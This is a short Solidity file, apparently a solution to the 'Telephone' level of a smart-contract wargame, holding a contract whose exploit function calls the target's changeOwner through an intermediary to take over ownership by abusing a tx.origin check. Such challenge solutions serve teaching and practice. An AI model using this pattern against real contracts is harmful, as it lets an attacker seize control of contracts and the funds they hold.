// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "instances/04_Telephone.sol";

contract AttackerTelephone {
    function exploit(address telephone) external {
        Telephone(telephone).changeOwner(msg.sender);
    }
}
